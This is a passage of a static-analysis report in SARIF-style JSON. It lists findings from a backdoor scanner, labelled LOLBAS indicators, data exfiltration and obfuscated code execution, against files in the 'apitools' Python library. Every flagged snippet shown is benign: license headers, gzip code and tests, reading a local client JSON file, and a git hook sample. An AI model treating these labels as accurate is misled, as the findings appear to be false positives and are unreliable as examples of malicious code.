                      "text": "            # case, but we *can* trust content-range, if it's present.\n            return ProcessContentRange(self.info['content-range'])\n        elif 'content-length' in self.info:\n            return int(self.info.get('content-length'))\n        elif 'content-range' in self.info:\n            return ProcessContentRange(self.info['content-range'])\n        return len(self.content)\n",
                      "markdown": "`            # case, but we *can* trust content-range, if it's present.\n            return ProcessContentRange(self.info['content-range'])\n        elif 'content-length' in self.info:\n            return int(self.info.get('content-length'))\n        elif 'content-range' in self.info:\n            return ProcessContentRange(self.info['content-range'])\n        return len(self.content)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip_test.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 7,
                  "endLine": 9,
                  "endColumn": 15,
                  "snippet": {
                    "text": "# support are removed as they're unsupported in 2.7. This backport patches a\n# streaming bug that exists in python 2.7.\n\n\"\"\"Test script for the gzip module.\n\"\"\"\n\nimport six\n",
                    "rendered": {
                      "text": "# support are removed as they're unsupported in 2.7. This backport patches a\n# streaming bug that exists in python 2.7.\n\n\"\"\"Test script for the gzip module.\n\"\"\"\n\nimport six\n",
                      "markdown": "`# support are removed as they're unsupported in 2.7. This backport patches a\n# streaming bug that exists in python 2.7.\n\n\"\"\"Test script for the gzip module.\n\"\"\"\n\nimport six\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip_test.py"
                },
                "region": {
                  "startLine": 464,
                  "startColumn": 20,
                  "endLine": 464,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n    def test_read_with_extra(self):\n        # Gzip data with an extra field\n        gzdata = (b'\\x1f\\x8b\\x08\\x04\\xb2\\x17cQ\\x02\\xff'\n                  b'\\x05\\x00Extra'\n                  b'\\x0bI-.\\x01\\x002\\xd1Mx\\x04\\x00\\x00\\x00')\n        with gzip.GzipFile(fileobj=io.BytesIO(gzdata)) as f:\n",
                    "rendered": {
                      "text": "\n    def test_read_with_extra(self):\n        # Gzip data with an extra field\n        gzdata = (b'\\x1f\\x8b\\x08\\x04\\xb2\\x17cQ\\x02\\xff'\n                  b'\\x05\\x00Extra'\n                  b'\\x0bI-.\\x01\\x002\\xd1Mx\\x04\\x00\\x00\\x00')\n        with gzip.GzipFile(fileobj=io.BytesIO(gzdata)) as f:\n",
                      "markdown": "`\n    def test_read_with_extra(self):\n        # Gzip data with an extra field\n        gzdata = (b'\\x1f\\x8b\\x08\\x04\\xb2\\x17cQ\\x02\\xff'\n                  b'\\x05\\x00Extra'\n                  b'\\x0bI-.\\x01\\x002\\xd1Mx\\x04\\x00\\x00\\x00')\n        with gzip.GzipFile(fileobj=io.BytesIO(gzdata)) as f:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/encoding.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip.py"
                },
                "region": {
                  "startLine": 145,
                  "startColumn": 7,
                  "endLine": 145,
                  "endColumn": 11,
                  "snippet": {
                    "text": "        The compresslevel argument is an integer from 0 to 9 controlling the\n        level of compression; 1 is fastest and produces the least compression,\n        and 9 is slowest and produces the most compression. 0 is no compression\n        at all. The default is 9.\n\n        The mtime argument is an optional numeric timestamp to be written\n        to the stream when compressing.  All gzip compressed streams\n",
                    "rendered": {
                      "text": "        The compresslevel argument is an integer from 0 to 9 controlling the\n        level of compression; 1 is fastest and produces the least compression,\n        and 9 is slowest and produces the most compression. 0 is no compression\n        at all. The default is 9.\n\n        The mtime argument is an optional numeric timestamp to be written\n        to the stream when compressing.  All gzip compressed streams\n",
                      "markdown": "`        The compresslevel argument is an integer from 0 to 9 controlling the\n        level of compression; 1 is fastest and produces the least compression,\n        and 9 is slowest and produces the most compression. 0 is no compression\n        at all. The default is 9.\n\n        The mtime argument is an optional numeric timestamp to be written\n        to the stream when compressing.  All gzip compressed streams\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip.py"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 7,
                  "endLine": 122,
                  "endColumn": 11,
                  "snippet": {
                    "text": "                 compresslevel=9, fileobj=None, mtime=None):\n        \"\"\"Constructor for the GzipFile class.\n\n        At least one of fileobj and filename must be given a\n        non-trivial value.\n\n        The new class instance is based on fileobj, which can be a regular\n",
                    "rendered": {
                      "text": "                 compresslevel=9, fileobj=None, mtime=None):\n        \"\"\"Constructor for the GzipFile class.\n\n        At least one of fileobj and filename must be given a\n        non-trivial value.\n\n        The new class instance is based on fileobj, which can be a regular\n",
                      "markdown": "`                 compresslevel=9, fileobj=None, mtime=None):\n        \"\"\"Constructor for the GzipFile class.\n\n        At least one of fileobj and filename must be given a\n        non-trivial value.\n\n        The new class instance is based on fileobj, which can be a regular\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip.py"
                },
                "region": {
                  "startLine": 388,
                  "startColumn": 32,
                  "endLine": 388,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            raise OSError(errno.EBADF, \"peek() on write-only GzipFile object\")\n\n        # Do not return ridiculously small buffers, for one common idiom\n        # is to call peek(1) and expect more bytes in return.\n        if n < 100:\n            n = 100\n        if self.extrasize == 0:\n",
                    "rendered": {
                      "text": "            raise OSError(errno.EBADF, \"peek() on write-only GzipFile object\")\n\n        # Do not return ridiculously small buffers, for one common idiom\n        # is to call peek(1) and expect more bytes in return.\n        if n < 100:\n            n = 100\n        if self.extrasize == 0:\n",
                      "markdown": "`            raise OSError(errno.EBADF, \"peek() on write-only GzipFile object\")\n\n        # Do not return ridiculously small buffers, for one common idiom\n        # is to call peek(1) and expect more bytes in return.\n        if n < 100:\n            n = 100\n        if self.extrasize == 0:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip.py"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 15,
                  "endLine": 150,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        The mtime argument is an optional numeric timestamp to be written\n        to the stream when compressing.  All gzip compressed streams\n        are required to contain a timestamp.  If omitted or None, the\n        current time is used.  This module ignores the timestamp when\n        decompressing; however, some programs, such as gunzip, make use\n        of it.  The format of the timestamp is the same as that of the\n        return value of time.time() and of the st_mtime member of the\n",
                    "rendered": {
                      "text": "        The mtime argument is an optional numeric timestamp to be written\n        to the stream when compressing.  All gzip compressed streams\n        are required to contain a timestamp.  If omitted or None, the\n        current time is used.  This module ignores the timestamp when\n        decompressing; however, some programs, such as gunzip, make use\n        of it.  The format of the timestamp is the same as that of the\n        return value of time.time() and of the st_mtime member of the\n",
                      "markdown": "`        The mtime argument is an optional numeric timestamp to be written\n        to the stream when compressing.  All gzip compressed streams\n        are required to contain a timestamp.  If omitted or None, the\n        current time is used.  This module ignores the timestamp when\n        decompressing; however, some programs, such as gunzip, make use\n        of it.  The format of the timestamp is the same as that of the\n        return value of time.time() and of the st_mtime member of the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/gzip.py"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 6,
                  "endLine": 23,
                  "snippet": {
                    "text": "\nimport struct\nimport sys\nimport time\nimport os\nimport zlib\nimport io\n\n",
                    "rendered": {
                      "text": "\nimport struct\nimport sys\nimport time\nimport os\nimport zlib\nimport io\n\n",
                      "markdown": "`\nimport struct\nimport sys\nimport time\nimport os\nimport zlib\nimport io\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/extra_types_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/buffered_stream_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 331,
                  "startColumn": 53,
                  "endLine": 331,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    client_parser.set_defaults(func=GenerateClient)\n\n    pip_package_parser = subparsers.add_parser(\n        'pip_package', help='Generate apitools client pip package')\n    pip_package_parser.set_defaults(func=GeneratePipPackage)\n\n    proto_parser = subparsers.add_parser(\n",
                    "rendered": {
                      "text": "    client_parser.set_defaults(func=GenerateClient)\n\n    pip_package_parser = subparsers.add_parser(\n        'pip_package', help='Generate apitools client pip package')\n    pip_package_parser.set_defaults(func=GeneratePipPackage)\n\n    proto_parser = subparsers.add_parser(\n",
                      "markdown": "`    client_parser.set_defaults(func=GenerateClient)\n\n    pip_package_parser = subparsers.add_parser(\n        'pip_package', help='Generate apitools client pip package')\n    pip_package_parser.set_defaults(func=GeneratePipPackage)\n\n    proto_parser = subparsers.add_parser(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 26,
                  "endLine": 39,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            'apitools.base.py', filename)\n        if src_data is None:\n            raise exceptions.GeneratedClientError(\n                'Could not find file %s' % filename)\n        out.write(src_data)\n\n\n",
                    "rendered": {
                      "text": "            'apitools.base.py', filename)\n        if src_data is None:\n            raise exceptions.GeneratedClientError(\n                'Could not find file %s' % filename)\n        out.write(src_data)\n\n\n",
                      "markdown": "`            'apitools.base.py', filename)\n        if src_data is None:\n            raise exceptions.GeneratedClientError(\n                'Could not find file %s' % filename)\n        out.write(src_data)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 35,
                  "endLine": 71,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n            raise exceptions.NotFoundError(\n                'Failed to open client json file: %s' % args.client_json)\n",
                    "rendered": {
                      "text": "                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n            raise exceptions.NotFoundError(\n                'Failed to open client json file: %s' % args.client_json)\n",
                      "markdown": "`                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n            raise exceptions.NotFoundError(\n                'Failed to open client json file: %s' % args.client_json)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 31,
                  "endLine": 70,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n            raise exceptions.NotFoundError(\n",
                    "rendered": {
                      "text": "            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n            raise exceptions.NotFoundError(\n",
                      "markdown": "`            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n            raise exceptions.NotFoundError(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 42,
                  "endLine": 69,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        try:\n            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n",
                    "rendered": {
                      "text": "        try:\n            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n",
                      "markdown": "`        try:\n            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/gen_client.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 23,
                  "endLine": 69,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        try:\n            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n",
                    "rendered": {
                      "text": "        try:\n            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n",
                      "markdown": "`        try:\n            with io.open(args.client_json, encoding='utf8') as client_json:\n                f = json.loads(util.ReplaceHomoglyphs(client_json.read()))\n                web = f.get('installed', f.get('web', {}))\n                client_id = web.get('client_id')\n                client_secret = web.get('client_secret')\n        except IOError:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/test_utils.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 24,
                  "endLine": 26,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                    "rendered": {
                      "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                      "markdown": "`\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 4,
                  "endLine": 49,
                  "endColumn": 9,
                  "snippet": {
                    "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                    "rendered": {
                      "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                      "markdown": "`fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 1,
                  "endLine": 43,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                    "rendered": {
                      "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                      "markdown": "`\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                    "rendered": {
                      "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                      "markdown": "`\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
